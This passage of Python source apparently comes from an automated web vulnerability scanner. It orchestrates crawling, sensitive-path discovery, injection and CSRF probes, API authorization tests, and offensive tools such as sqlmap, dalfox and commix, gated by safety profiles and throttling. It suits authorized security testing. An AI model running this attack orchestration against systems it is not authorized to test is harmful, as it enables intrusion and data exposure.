            ok, note = verify_csrf(t, cookie, active=fuzz_forms)
            _cev = _evid_take()
            if ok:
                csrf_hit = (t.url, t.method, note, _cev)
        except Exception:  # noqa: BLE001,S110
            _evid_take()
        # DOM-XSS is page-level (source->sink in the page JS), not per-param — check the page once.
        try:
            _evid_start()
            ok, note = verify_dom_xss(t.url, cookie)
            _dev = _evid_take()
            if ok:
                _emit("xss", None, f"dom: {note}", _dev)
        except Exception:  # noqa: BLE001,S110
            _evid_take()
        _set_inject_ctx(t)   # tell _req this target's injection shape (path-param / JSON body)
        for param in t.params:
            # each check records its own request/response exchange(s) as proof for the finding.
            def _ck(fn, cat, prefix=""):
                _evid_start()
                try:
                    ok, note = fn(t.url, param, t.method, cookie)
                except Exception:  # noqa: BLE001
                    _evid_take()
                    return
                ev = _evid_take()
                if ok:
                    _emit(cat, param, prefix + note, ev)
            try:
                _ck(verify_cmdi, "command-injection")
                _ck(verify_reflected_xss, "xss")
                _ck(verify_sqli, "sql-injection")
                _ck(verify_lfi, "file-inclusion")
                _ck(verify_open_redirect, "open-redirect")
                # stored XSS only makes sense on POST forms; it WRITES data, so production-safe
                # (fuzz_forms=False) skips it.
                if t.method == "POST" and fuzz_forms:
                    _evid_start()
                    ok, note = verify_stored_xss(t, param, cookie)
                    _sev = _evid_take()
                    if ok:
                        _emit("xss", param, f"stored: {note}", _sev)
            except Exception:  # noqa: BLE001,S112 - one param must never sink the target
                continue
        return found, csrf_hit

    # Parallelise across targets: the checks are network-I/O-bound, so a thread pool turns the
    # (formerly sequential, rate-limited) probe stage from hours into minutes at benchmark scale.
    # Concurrency is bounded by the policy (production-safe stays low, so fragile targets are not
    # hammered), overridable via DASTNG_PROBE_WORKERS. Results are collected lock-free from each
    # worker's return value.
    _workers = int(os.environ.get("DASTNG_PROBE_WORKERS", "0") or "0") or \
        (max(4, getattr(politeness, "concurrency", 10)) if politeness else 10)
    out: list[Finding] = []
    _csrf_hits: list[tuple[str, str, str]] = []
    with ThreadPoolExecutor(max_workers=_workers) as _ex:
        for _found, _csrf in _ex.map(_probe_one, targets):
            out.extend(_found)
            if _csrf:
                _csrf_hits.append(_csrf)

    # CSRF grouping: an app with no CSRF framework flags EVERY state-changing endpoint — that's
    # ONE systemic weakness, not N vulnerabilities. Above a threshold, collapse to a single
    # systemic finding (with a sample + the full endpoint list in evidence); below it, report the
    # handful individually as a targeted gap. Prevents the 1298-finding flood on WAVSEP.
    if _csrf_hits:
        _CSRF_GROUP_THRESHOLD = 8
        if len(_csrf_hits) >= _CSRF_GROUP_THRESHOLD:
            _paths = [urlsplit(h[0]).path for h in _csrf_hits]
            _sample = ", ".join(_paths[:5]) + (" ..." if len(_paths) > 5 else "")
            out.append(Finding(
                tool="verify", category="csrf", url=_csrf_hits[0][0], param=None, method="*",
                evidence=(f"Systemic: {len(_csrf_hits)} state-changing endpoints lack CSRF "
                          f"protection (no anti-CSRF token, session cookie without SameSite, "
                          f"Origin/Referer not validated) — the app has no CSRF framework. "
                          f"Sample: {_sample}"),
                verified=True, evidence_log=(_csrf_hits[0][3] if len(_csrf_hits[0]) > 3 else [])))
        else:
            for h in _csrf_hits:
                u, m, n = h[0], h[1], h[2]
                out.append(Finding(tool="verify", category="csrf", url=u, param=None,
                                   method=m, evidence=n, verified=True,
                                   evidence_log=(h[3] if len(h) > 3 else [])))
    return out


# Category per roster tool (adapter finding dicts vary; this is the fallback classification).
_ROSTER_CAT = {
    "dalfox": "xss", "ghauri": "sql-injection", "commix": "command-injection",
    "crlfuzz": "crlf-injection", "sstimap": "ssti", "lfi_fuzz": "file-inclusion",
    "rfi_oast": "rfi", "dotdotpwn": "file-inclusion", "schemathesis": "api-fuzz",
    "jwt_tool": "jwt", "graphw00f": "graphql", "gitleaks": "secret", "trufflehog": "secret",
    "openredirex": "open-redirect", "xsrfprobe": "csrf",
}
# The full detection roster the mega scan runs over the SAFE frontier. nuclei + sqlmap are
# already hand-coded above; ZAP is intentionally excluded (its full-scan re-crawls and can
# crash fragile targets — the failure we hit on WAVSEP; use `launch -w full` if you want it).
_MEGA_ROSTER = ["dalfox", "ghauri", "lfi_fuzz", "commix", "crlfuzz", "sstimap", "rfi_oast",
                "dotdotpwn", "openredirex", "xsrfprobe", "schemathesis", "jwt_tool",
                "graphw00f", "gitleaks", "trufflehog"]


# Roster tools that loop one subprocess PER URL (expensive at scale) vs tools that batch a whole
# URL list in one process. Batch tools always get the FULL frontier (they scale and are the
# primary breadth detectors — dalfox for XSS especially); per-URL tools get a stratified,
# per-category-balanced cap so they cover a SPREAD of the surface instead of the first N of a
# sorted list (the bug that fed dalfox 40 LFI URLs and zero XSS on the first WAVSEP benchmark).
# rfi_oast is NOT here on purpose: it's fast in-process httpx (one GET per URL + an OAST check),
# not a slow subprocess-per-URL tool, so it takes the FULL frontier — capping it at the stratified
# per-URL sample is what limited RFI recall (it only tested ~30 of thousands of params).
_PER_URL_TOOLS = {"ghauri", "commix", "lfi_fuzz", "sstimap", "dotdotpwn"}


def _stratified_sample(urls: list[str], cap: int) -> list[str]:
    """Round-robin sample up to `cap` URLs spread across path-directory groups, so a per-URL
    tool sees a balance of every app area / vuln category rather than all-of-one. cap<=0 = all."""
    if cap <= 0 or len(urls) <= cap:
        return urls
    groups: dict[str, list[str]] = {}
    for u in urls:
        d = urlsplit(u).path.rsplit("/", 1)[0]
        groups.setdefault(d, []).append(u)
    order = sorted(groups)
    out: list[str] = []
    i = 0
    while len(out) < cap and any(groups[g] for g in order):
        g = order[i % len(order)]
        if groups[g]:
            out.append(groups[g].pop(0))
        i += 1
    return out


def run_roster(target: str, safe_urls: list[str], cookie: str, policy,
               js_dir: str = "", level_override: int | None = None, health=None,
               per_url_cap: int = 0, progress=None, base_findings=None,
               api_surface: dict | None = None) -> list[Finding]:
    """Run the full detection roster over the SAFE, converged frontier and normalize each
    adapter's findings to Finding. Tools whose surface is absent (GraphQL/OpenAPI/JWT/JS)
    cleanly no-op. Every tool is isolated so one failure never sinks the scan.

    level_override caps injection depth under target stress; a TargetHealth monitor (health)
    is re-checked between tools so the roster halts gracefully instead of grinding a dead target
    through every remaining tool's full timeout."""
    from .orchestrator.adapters import REGISTRY
    from .orchestrator.adapters.base import RunContext
    _lvl = level_override or policy.sqlmap_level
    # Shorter per-tool budget once stressed (reduced depth) so no single tool pins a fragile app.
    _to = 1800 if _lvl >= 5 else 600
    # CRITICAL for "safe": the roster subprocess tools default to aggressive concurrency
    # (dalfox = 100 workers, crlfuzz = 25) that DoSes a fragile single-process target — this is
    # what killed the Juice Shop demo mid-roster. Propagate the policy's politeness so every
    # tool honors the same throttle the Python probes do.
    _pol = policy.politeness
    opts = {"cookie": cookie, "inject_cap": 0, "timeout": _to,
            "sqlmap_level": _lvl,
            # Owned-lab depth lever: safe-deep defaults risk 1 (safe payloads only) for live
            # client infra. DASTNG_SQLMAP_RISK lets an operator raise it (2 adds OR-based, 3 adds
            # heavy time-based) on an authorized owned/benchmark target, without changing the
            # safe default. The adaptive health monitor still backs off if the target struggles.
            "sqlmap_risk": int(os.environ.get("DASTNG_SQLMAP_RISK", policy.sqlmap_risk)),
            "sqli_level": _lvl, "lfi_deep": policy.lfi_deep, "js_dir": js_dir,
            "workers": max(1, _pol.concurrency), "delay_ms": _pol.delay_ms,
            "rps": _pol.rps,
            # RFI/SSRF out-of-band detection: interface the target can reach back to (a same-LAN
            # IP for a self-hosted OastServer, or a public interactsh host). Without it, rfi_oast
            # falls back to in-band reflection only. Set via DASTNG_OAST_HOST_IP.
            "oast_host_ip": os.environ.get("DASTNG_OAST_HOST_IP", "")}
    # Feed the discovered API surface to the API adapters (schemathesis/jwt_tool/graphw00f) — the
    # inputs they need but nothing else populates, which is why they always no-opped. Only present
    # keys are set, so a classic app still cleanly reports "not applicable".
    if api_surface:
        opts.update({k: v for k, v in api_surface.items() if v})
    # Three frontier tiers under a cap:
    #  - per-URL subprocess tools (sqlmap/ghauri/commix/lfi_fuzz): small stratified sample.
    #  - dalfox: runs ONE subprocess per endpoint-GROUP, so on an app with many unique paths
    #    (WAVSEP: ~3300) "full frontier" = thousands of invocations = hours. It needs a bounded
    #    (larger) stratified sample too. nuclei-dast already provides the XSS/SQLi breadth at
    #    true streaming-batch scale, so dalfox is confirmation, not the sole detector.
    #  - genuinely single-process batch tools (crlfuzz/gitleaks/...) get the full frontier.
    capped_urls = _stratified_sample(safe_urls, per_url_cap) if per_url_cap else safe_urls
    batch_cap = max(per_url_cap * 8, 240) if per_url_cap else 0
    dalfox_urls = _stratified_sample(safe_urls, batch_cap) if batch_cap else safe_urls
    out: list[Finding] = []
    for name in _MEGA_ROSTER:
        ad = REGISTRY.get(name)
        if ad is None or not ad.available():
            continue
        if getattr(ad, "active", False) and not policy.active_scan:
            continue
        # Circuit breaker: if the target went unhealthy, stop launching more active tools
        # (the halt is surfaced via health.events in the run summary, never silently).
        if health is not None and getattr(ad, "active", False) and health.check() >= 2:
            break
        if name in _PER_URL_TOOLS:
            tool_urls = capped_urls
        elif name == "dalfox":
            tool_urls = dalfox_urls   # bounded: one subprocess per endpoint-group
        else:
            tool_urls = safe_urls     # genuinely single-process batch tools
        try:
            res = ad.run(RunContext(target=target, seed_urls=tool_urls, options=opts))
        except Exception:  # noqa: BLE001,S112 - one tool must never sink the mega scan
            continue
        cat = _ROSTER_CAT.get(name)
        tool_raw = ""
        if res.raw is not None:
            try:
                tool_raw = (res.raw if isinstance(res.raw, str)
                            else json.dumps(res.raw, indent=1, default=str))[:12000]
            except Exception:  # noqa: BLE001
                tool_raw = str(res.raw)[:12000]
        for f in (res.findings or []):
            fcat = cat or f.get("category") or f.get("type") or f.get("name") or name
            url = f.get("url") or f.get("matched-at") or f.get("data") or target
            ev = (f.get("evidence") or f.get("name") or f.get("info", {}).get("name") if isinstance(f.get("info"), dict)
                  else f.get("evidence") or f.get("name") or f.get("message_str") or "")
            # Capture the tool's OWN request/response (nuclei -irr, dalfox PoC, etc.) as proof.
            req, resp = f.get("request"), f.get("response")
            ev_log = []
            if req or resp:
                ev_log = [{
                    "label": f.get("template-id") or f.get("matcher-name") or f.get("template") or name,
                    "request": {"method": f.get("method", "GET"), "url": str(f.get("matched-at") or url),
                                "headers": {}, "body": str(req or "")[:_EVID_MAX_BODY]},
                    "response": {"status": f.get("status"), "headers": {},
                                 "elapsed_ms": None, "size": len(str(resp or "")),
                                 "body": str(resp or "")[:_EVID_MAX_BODY]},
                }]
            # Per-finding raw detail: the tool's own JSON for this hit (matcher, extracted, cvss…).
            try:
                fraw = json.dumps(f, indent=1, default=str)[:9000]
            except Exception:  # noqa: BLE001
                fraw = str(f)[:9000]
            extracted = f.get("extracted-results") or f.get("extracted") or ""
            det = f.get("matcher-name") or f.get("type") or (f.get("info", {}) or {}).get("severity") \
                if isinstance(f.get("info"), dict) else (f.get("matcher-name") or f.get("type") or "tool-detection")
            out.append(Finding(
                tool=name, category=fcat, url=str(url).split("?")[0], param=f.get("param"),
                evidence=str(ev)[:400], evidence_log=ev_log,
                raw_output=(fraw or tool_raw), repro=str(f.get("curl-command") or "")[:1200],
                payload=str(f.get("payload") or f.get("curl-command") or extracted or "")[:400],
                detection=str(det or "tool-detection"), confidence="firm", verified=True))
        # checkpoint after each roster tool so a kill mid-roster still shows tool-by-tool
        # progress AND flushes cumulative findings to disk (base + roster-so-far).
        if progress is not None:
            try:
                progress.update(f"roster:{name}", (base_findings or []) + out)
            except Exception:  # noqa: BLE001,S110
                pass
    return out


class _Progress:
    """Incremental checkpoint writer: after every stage, atomically rewrite a JSON file with
    everything found so far + a stage timeline. So a scan that is killed / crashes / hangs still
    leaves an observable, up-to-date record of what it accomplished (instead of losing the whole
    in-memory run). Enabled by DASTNG_PROGRESS_FILE. Cheap (a few hundred findings), best-effort
    (never raises into the scan)."""

    def __init__(self, path: str):
        self.path = path
        self.t0 = time.monotonic()
        self.timeline: list[dict] = []

    def update(self, stage: str, findings: list, *, urls: int = 0, targets: int = 0,
               note: str = "") -> None:
        if not self.path:
            return
        elapsed = round(time.monotonic() - self.t0)
        self.timeline.append({"stage": stage, "elapsed_s": elapsed,
                              "cumulative_findings": len(findings), "note": note})
        rec = {
            "status": "in-progress", "last_stage": stage, "elapsed_s": elapsed,
            "urls": urls, "targets": targets,
            "n_findings": len(findings),
            "by_category": dict(_Counter(getattr(f, "category", "") for f in findings)),
            "by_tool": dict(_Counter(getattr(f, "tool", "") for f in findings)),
            "timeline": self.timeline,
            "findings": [f.__dict__ for f in findings],
        }
        try:  # atomic write so a reader never sees a half-written file
            tmp = self.path + ".tmp"
            with open(tmp, "w") as fh:
                json.dump(rec, fh, default=str)
            os.replace(tmp, self.path)
        except Exception:  # noqa: BLE001,S110 - progress writing must never break the scan
            pass


class SessionKeeper:
    """Keeps an authenticated session alive across a long unattended engagement.

    A static captured cookie silently dies mid-scan on any real app — idle timeout, session
    rotation, or a stray logout link — and the scan then degrades to hammering the login page and
    reporting nothing, with nobody watching. This probes session validity at each stage boundary
    and RE-AUTHENTICATES on loss, refreshing the cookie for every downstream tool (katana -H,
    sqlmap, nuclei, the native probes). Without a probe+reauth it is inert (back-compat).

    - probe_url: an in-app URL that REQUIRES auth (redirects to / renders login when logged out).
    - ok_marker: a substring present ONLY when authenticated (e.g. 'Logout'). If empty, a
      login-redirect / login-form heuristic decides.
    - reauth:    callable() -> fresh cookie string (a form-login, or the Playwright MFA module).
    """

    def __init__(self, cookie: str, probe_url: str = "", ok_marker: str = "", reauth=None):
        self.cookie = cookie or ""
        self.probe_url = probe_url or ""
        self.ok_marker = ok_marker or ""
        self.reauth = reauth
        self.reauths = 0
        self.enabled = bool(self.probe_url and reauth)

    def alive(self) -> bool:
        """True if the current cookie still authenticates. Inconclusive/error => True (never
        thrash a re-auth on a transient network blip)."""
        if not self.probe_url:
            return True
        import httpx
        hdr = {"Cookie": self.cookie} if self.cookie else {}
        try:
            r = httpx.get(self.probe_url, headers=hdr, follow_redirects=False, timeout=10)
            if r.status_code in (301, 302, 303, 307, 308):
                loc = (r.headers.get("location") or "").lower()
                return not any(w in loc for w in ("login", "signin", "sign-in", "auth", "sso"))
            body = r.text.lower()
            if self.ok_marker:
                return self.ok_marker.lower() in body
            # heuristic: a login form on a page that should be authed => logged out
            looks_login = "password" in body and any(
                m in body for m in ('name="username"', 'name="user"', "user_token",
                                    "sign in", "log in", "login"))
            return not looks_login
        except Exception:  # noqa: BLE001 - inconclusive: assume alive, don't false-reauth
            return True

    def ensure(self, stage: str = "") -> str:
        """Probe; re-authenticate on loss. Returns the current (possibly refreshed) cookie so the
        caller threads it into the next stage's tools."""
        if not self.enabled or self.alive():
            return self.cookie
        print(f"[session] auth lost before '{stage}' — re-authenticating", flush=True)
        try:
            fresh = self.reauth()
        except Exception as e:  # noqa: BLE001
            print(f"[session] re-auth FAILED: {e}", flush=True)
            return self.cookie
        if fresh and fresh != self.cookie:
            self.cookie = fresh
            self.reauths += 1
            print(f"[session] re-auth {'restored' if self.alive() else 'did NOT restore'} "
                  f"session (#{self.reauths})", flush=True)
        return self.cookie


def _env_reauth():
    """Build a reauth callable from DASTNG_REAUTH_CMD: a shell command that (re)authenticates and
    prints a fresh 'name=value; ...' cookie string as its LAST stdout line. Decouples re-auth from
    the engagement — the operator supplies any login flow (form login, script, Playwright)."""
    cmd = os.environ.get("DASTNG_REAUTH_CMD")
    if not cmd:
        return None

    def _do() -> str:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
        lines = [ln.strip() for ln in out.stdout.splitlines() if "=" in ln and ln.strip()]
        return lines[-1] if lines else ""
    return _do


def run_engagement(target: str, cookie: str, host: str, depth: int = 3, *,
                   dom: bool = True, tools: bool = True, profile: str = "safe-deep",
                   zap: bool = True, reauth=None, session_probe: str = "",
                   session_marker: str = "", jwt_refresh=None) -> dict:
    """Full blind flow covering BOTH profiles: blatant injection (DVWA-style) AND the
    hardened-app profile (config/passive + vulnerable JS + API + DOM-based). Returns
    {urls, targets, findings} with findings verified.

    profile: ScanPolicy name. 'production-safe' (live/client infra) throttles hard, sends NO
    data-mutating traffic, skips destructive/notifying endpoints, and limits sqlmap to safe
    techniques. 'passive-only' sends no attack traffic at all. 'staging'/'aggressive' are for
    disposable targets. Auth endpoints (login/logout/reset) are NEVER actively tested under any
    profile, so the scan cannot lock accounts."""
    from .dom import dom_probe
    from .jsanalysis import analyze_js
    from .passive import passive_scan
    from .safety import get_policy, is_auth_endpoint, is_state_changing

    policy = get_policy(profile)
    pol = policy.politeness

    # Session keeper: a long unattended scan MUST survive session loss (idle timeout / rotation /
    # stray logout) or it silently degrades to scanning the login page. Probe validity at each
    # stage boundary and re-auth on loss, refreshing the cookie for every downstream tool. Inert
    # unless a probe URL + reauth are supplied (params or env), so back-compat is preserved.
    _session = SessionKeeper(
        cookie,
        probe_url=session_probe or os.environ.get("DASTNG_SESSION_PROBE_URL", ""),
        ok_marker=session_marker or os.environ.get("DASTNG_SESSION_MARKER", ""),
        reauth=reauth or _env_reauth())
    if _session.enabled:
        print(f"[session] keeper armed (probe={_session.probe_url})", flush=True)
        cookie = _session.ensure("preflight")
    # Rate override for robust targets (owned labs / benchmark apps with thousands of cases):
    # safe-deep's 2-rps throttle is right for fragile client prod, but it makes the active
    # detectors (nuclei-dast/dalfox) time out over a huge frontier. DASTNG_RPS / DASTNG_CONCURRENCY
    # let an operator raise the rate for a target that can take it, WITHOUT changing depth
    # (L5 / full payloads / full roster stay the same). The adaptive health monitor still backs
    # off if the target starts struggling, so this is a ceiling, not a foot-gun.
    _rps_ov, _conc_ov = os.environ.get("DASTNG_RPS"), os.environ.get("DASTNG_CONCURRENCY")
    if _rps_ov or _conc_ov:
        import dataclasses
        pol = dataclasses.replace(pol, rps=float(_rps_ov or pol.rps),
                                  concurrency=int(_conc_ov or pol.concurrency))
        policy = dataclasses.replace(policy, politeness=pol)  # so run_roster sees it too

    # ---- pre-flight fingerprint: decide crawl strategy WITHOUT a human -------
    # Detect app type (SPA vs server-rendered vs API), pick headless-vs-plain, and, when the
    # landing page is link-poor, auto-discover real entry seeds (robots/sitemap/text-hints/
    # conventional index files). This is what lets an unattended engagement adapt instead of
    # crawling one URL off a link-less landing page.
    from .fingerprint import build_attack_profile, fingerprint_target
    try:
        appprof = fingerprint_target(target, host, cookie)
        print(f"[fingerprint] {appprof.summary()}", flush=True)
        for _s in appprof.signals:
            print(f"[fingerprint]   - {_s}")
    except Exception as _fe:  # noqa: BLE001 - fingerprint must never sink the scan
        print(f"[fingerprint] failed ({_fe}); conservative plain crawl from seed only")
        appprof = None
    # Fingerprint -> PROBE strategy: which app-appropriate deep techniques to ADD on top of the
    # full baseline (dialect-aware SQLi keys off live error signatures; DOM-XSS + stack-specific
    # payloads + API-tool emphasis key off this profile). Never removes coverage.
    _atk = build_attack_profile(appprof)
    print(f"[fingerprint] {_atk.summary()}", flush=True)

    _headless = appprof.headless if appprof else None
    _seeds = appprof.entry_seeds if appprof else []
    urls = blind_crawl(target, cookie, depth=depth, politeness=pol,
                       headless=_headless, seeds=_seeds)

    # ---- crawl-reach self-check: escalate if coverage came back trivially small ----
    # A healthy crawl reaches many URLs; ~one means the strategy was wrong (headless on a
    # server-rendered app that needs none, or a seed with nothing to follow). Try the opposite
    # headless mode from any discovered seeds before giving up. Logged, never silent.
    if len(urls) <= max(3, len(_seeds) + 1):
        alt_headless = not (_headless if _headless is not None else True)
        alt_roots = _seeds or ([appprof.target] if appprof else [target])
        print(f"[crawl-reach] only {len(urls)} URL(s) from primary strategy; "
              f"escalating: headless={alt_headless}, {len(alt_roots)} seed root(s)")
        try:
            alt = blind_crawl(target, cookie, depth=depth, politeness=pol,
                              headless=alt_headless, seeds=alt_roots)
            if len(alt) > len(urls):
                print(f"[crawl-reach] escalation recovered {len(alt)} URL(s)")
                urls = sorted(set(urls) | set(alt))
        except Exception as _ce:  # noqa: BLE001
            print(f"[crawl-reach] escalation failed: {_ce}")

    # Convergence discovery — the crawl alone misses surface the scanners then never see. Feed
    # the frontier from two more sources so nuclei/PII/injection cover what katana can't reach:
    #  (a) link-harvester: exhaustively expand index/listing pages katana under-follows.
    #  (b) feroxbuster: content brute-force well-known sensitive paths + API roots (/ftp, /.git,
    #      /.env, /swagger, /actuator, backups) — the holes nothing links to.
    from .orchestrator.adapters import REGISTRY
    from .orchestrator.adapters.base import RunContext as _RC
    # Discovery throttle: gentle but not glacial. feroxbuster's default 50 threads DoSes
    # fragile single-process apps, but the policy's 2-rps floor timed out over a 4.7k wordlist.
    # Content discovery is read-only GETs (lower risk than injection). Derive a conservative
    # ceiling from the policy; feroxbuster's --auto-tune/--auto-bail (set in the adapter) then
    # self-lower the rate and abort if the target struggles, so this is a ceiling, not a floor.
    _ferox_threads = max(4, pol.concurrency * 2) if pol else 8
    _ferox_rate = max(10, int(pol.rps * pol.concurrency * 2)) if pol else 15
    _dopts = {"cookie": cookie, "harvest_rounds": 3, "ferox_depth": 2, "timeout": 1500,
              "ferox_threads": _ferox_threads, "ferox_rate": _ferox_rate}
    if os.environ.get("DASTNG_FEROX_WORDLIST"):   # operator override (e.g. a fast list)
        _dopts["ferox_wordlist"] = os.environ["DASTNG_FEROX_WORDLIST"]
    for _tool, _seeds in (("linkharvest", urls), ("feroxbuster", None)):
        try:
            _r = REGISTRY[_tool].run(_RC(target=target, seed_urls=_seeds or [], options=_dopts))
            if _r.discovered_urls:
                urls = sorted(set(urls) | set(_r.discovered_urls))
        except Exception:  # noqa: BLE001,S112 - a discovery tool failing must not sink the scan
            continue

    # JS/API discovery: pull API routes out of JS so unlinked endpoints get tested too.
    js_urls = [u for u in urls if u.split("?")[0].endswith(".js")]
    api_eps, vuln_libs = analyze_js(js_urls, cookie, host)
    urls = sorted(set(urls) | set(api_eps))

    # The crawl can outlive the session (a long headless crawl, a stray logout). Re-auth before
    # form discovery so fetch_forms parses the REAL authenticated forms, not the login page (the
    # exact failure DVWA exposed: dead session => every form looked like the login form).
    cookie = _session.ensure("discover-targets")
    targets = discover_targets(urls, cookie, host)
    # SAFETY: never actively test auth endpoints (submitting payloads/failed logins there
    # locks accounts and logs the scanner out). Passive checks still cover them read-only.
    targets = [t for t in targets if not is_auth_endpoint(t.url)]
    # SAFETY: under production-safe, never fuzz destructive/notifying endpoints
    # (delete/send/pay/...). They are still crawled + passively analyzed, just not attacked.
    active_targets = targets
    skipped_state_changing = 0
    if policy.skip_state_changing:
        active_targets = [t for t in targets if not is_state_changing(t.url)]
        skipped_state_changing = len(targets) - len(active_targets)
    # production-safe also skips POST-form fuzzing entirely (no data mutation)
    if not policy.fuzz_forms:
        active_targets = [t for t in active_targets if t.method != "POST"]
    findings: list[Finding] = []

    # Incremental progress checkpoint (crash-survivable observability): after each stage, rewrite
    # DASTNG_PROGRESS_FILE with everything found so far + a stage timeline. So even a killed/hung
    # scan leaves a readable record of what it got done.
    _prog = _Progress(os.environ.get("DASTNG_PROGRESS_FILE", ""))
    _prog.update("crawl+discovery", findings, urls=len(urls), targets=len(targets),
                 note=f"{len(active_targets)} active targets")

    # Response-pipeline PII sink: every probe response (incl. audit-time responses to injected
    # payloads) is inspected for PII, Burp-style — not just the crawled surface.
    from .pii import ResponsePiiCollector
    _pii_collector = ResponsePiiCollector()
    set_pii_sink(_pii_collector)

    # Adaptive target-health monitor: keeps safe-deep one profile that self-throttles. It is
    # pinged between heavy stages; a stressed target steps L5 -> L3, a failing one halts the
    # active scan (findings preserved) instead of grinding for hours against a dying app —
    # which is exactly what DoSed the fragile demo target on the first full run.
    from .safety import TargetHealth
    health = TargetHealth(base_url=target, cookie=cookie)

    # Per-parameter subprocess tools (sqlmap/ghauri/commix in the roster) cost one process per
    # target; on a benchmark app with thousands of parameterized cases (WAVSEP) that is days of
    # runtime. DASTNG_INJECT_CAP bounds how many params those heavy tools attack (0 = unbounded).
    # The SCALABLE detectors that give recall — nuclei-dast (batch) + dalfox (batch) +
    # deterministic probe_targets — still run over ALL cases, so recall is not capped, only the
    # slow exploitation depth is. The cap is surfaced in the summary (never a silent truncation).
    _inject_cap = int(os.environ.get("DASTNG_INJECT_CAP", "0") or "0")

    # 1) FAST detection breadth first — capture the full matrix while the target is certainly
    #    alive, BEFORE the heavy sqlmap depth pass (section 5). Ordering matters: sqlmap L5 is
    #    the slowest + most target-hostile stage and adds little the fast detectors miss, so it
    #    runs LAST; a fragile target that dies under it has already yielded everything else.
    #    Skipped entirely under passive-only (active_scan=False): read-only recon.
    if tools and policy.active_scan:
        cookie = _session.ensure("active-scan")   # authed before the whole detection roster
        # API-surface discovery (adaptive): find the OpenAPI schema / GraphQL endpoint / JWT the
        # API adapters need but nothing else populates — the reason schemathesis/jwt_tool/graphw00f
        # never fired. Runs on every app; a classic app simply yields nothing and they no-op.
        _api = discover_api_surface(target, urls, cookie)

        def _apply_jwt(tok: str) -> None:
            """Set bearer auth on every probe + carry the token to the API tools."""
            if tok:
                _api["jwt"] = tok
                set_auth_header({"Authorization": f"Bearer {tok}"})

        # JWT refresh: short-lived API tokens (VAmPI = 60s) expire mid-scan, silently 401-ing every
        # later request. A refresh hook re-mints one; called before each heavy stage below.
        def _refresh_jwt(stage: str) -> None:
            if not jwt_refresh:
                return
            try:
                tok = jwt_refresh()
            except Exception as e:  # noqa: BLE001
                print(f"[jwt] refresh failed before '{stage}': {e}", flush=True)
                return
            if tok:
                _apply_jwt(tok)
                print(f"[jwt] refreshed before '{stage}'", flush=True)

        _apply_jwt(_api.get("jwt", ""))
        if _api:
            print(f"[api-surface] {', '.join(f'{k}={str(v)[:60]}' for k, v in _api.items())}",
                  flush=True)
        elif _atk.api_mode:
            print("[api-surface] app fingerprinted as API but no schema/endpoint/JWT found",
                  flush=True)
        # OpenAPI -> frontier: the spec is the API's sitemap. Seed every documented endpoint as a
        # target so the injection probes + nuclei fuzz real endpoints (an API has no HTML links, so
        # the crawler alone leaves targets=0).
        if _api.get("openapi_schema"):
            _oa_t, _oa_u = seed_targets_from_openapi(_api["openapi_schema"], cookie)
            _seed = [t for t in _oa_t if not is_auth_endpoint(t.url)]
            if policy.skip_state_changing:
                _seed = [t for t in _seed if not is_state_changing(t.url)]
            if not policy.fuzz_forms:
                _seed = [t for t in _seed if t.method != "POST"]
            _known = {(t.url, t.method, tuple(t.params)) for t in active_targets}
            _new = [t for t in _seed if (t.url, t.method, tuple(t.params)) not in _known]
            active_targets.extend(_new)
            targets = list(targets) + _new
            urls = sorted(set(urls) | set(_oa_u))
            _prog.update("openapi-seed", findings, urls=len(urls), targets=len(targets))
            print(f"[api-surface] OpenAPI seeded {len(_new)} injection target(s) + "
                  f"{len(_oa_u)} endpoint URL(s)", flush=True)
        # nuclei-dast is a subprocess detector too: at WAVSEP scale (~1800 targets) it can't
        # finish at any safe rate and, running FIRST, it blocks everything (the recurring stall).
        # Cap it to a stratified per-category sample like the other active tools when a cap is
        # set; the uncapped deterministic probes are the full-coverage recall backbone. Small
        # real apps (no cap) still get every target.
        _nd_targets = [t.url for t in active_targets if t.method == "GET" and t.params]
        if _inject_cap:
            _ncap = int(os.environ.get("DASTNG_NUCLEI_CAP", "400") or "400")
            _nd_targets = _stratified_sample(_nd_targets, _ncap)
        findings += run_nuclei_dast(_nd_targets, cookie, politeness=pol)
        _prog.update("nuclei-dast", findings, urls=len(urls), targets=len(targets))
        # Full detection roster over the SAFE frontier (dalfox/ghauri/lfi_fuzz/commix/crlfuzz/
        # sstimap/rfi_oast/dotdotpwn/schemathesis/jwt_tool/graphw00f/gitleaks/trufflehog).
        # This is what makes it the mega scan — the roster, not just the core subset.
        if not health.halted:
            # FULL frontier to the roster: batch tools (dalfox/nuclei) cover every case; the
            # per-URL subprocess tools get a stratified per-category cap inside run_roster.
            _safe_urls = [t.url for t in active_targets if t.params] or \
                [t.url for t in active_targets]
            findings += run_roster(target, _safe_urls, cookie, policy,
                                   js_dir=os.environ.get("DASTNG_JS_DIR", ""),
                                   level_override=health.sqlmap_level(policy.sqlmap_level),
                                   health=health, per_url_cap=_inject_cap, progress=_prog,
                                   base_findings=list(findings), api_surface=_api)
        _prog.update("roster", findings, urls=len(urls), targets=len(targets))
        # completeness probes only while the target is alive (they replay payloads = more load)
        if not health.halted:
            cookie = _session.ensure("probes")   # roster is long; re-auth before native probes
            _refresh_jwt("probes")
            findings += probe_targets(active_targets, cookie, politeness=pol,
                                      fuzz_forms=policy.fuzz_forms)
        _prog.update("probes", findings, urls=len(urls), targets=len(targets))
        # API authorization tests (BOLA/IDOR + mass assignment) — OWASP API Top-10 leaders, the
        # top healthcare-API risk. Stateful/multi-request + object-mutating, so gated on fuzz_forms
        # (owned/authorized). Uses the current bearer identity (set via _apply_jwt).
        if _api.get("openapi_schema") and policy.fuzz_forms:
            _refresh_jwt("api-authz")
            _authz = run_api_authz_tests(_api["openapi_schema"], cookie, policy.fuzz_forms)
            if _authz:
                findings += _authz
                print(f"[api-authz] {len(_authz)} BOLA/mass-assignment finding(s)", flush=True)
            _prog.update("api-authz", findings, urls=len(urls), targets=len(targets))
        # verify (deterministic replay) the fast-detector findings now, while the target is
        # still healthy — sqlmap (section 5) may stress it afterward.
        findings = [verify_finding(f, cookie) for f in findings]

    # 2) passive/config (hardened-app bulk: headers, cookies, CORS, TLS hygiene)
    for pf in passive_scan(urls, cookie):
        _ev = []
        if getattr(pf, "response", None):
            _pr = dict(pf.response)
            _pr["response"] = {**_pr["response"], "headers": _redact_headers(_pr["response"].get("headers", {}))}
            _ev = [_pr]
        findings.append(Finding(tool="passive", category=pf.category, url=pf.url,
                                param=pf.check, evidence=pf.detail, verified=True,
                                evidence_log=_ev, detection="passive response analysis",
                                confidence="firm"))
    _prog.update("passive", findings, urls=len(urls), targets=len(targets))

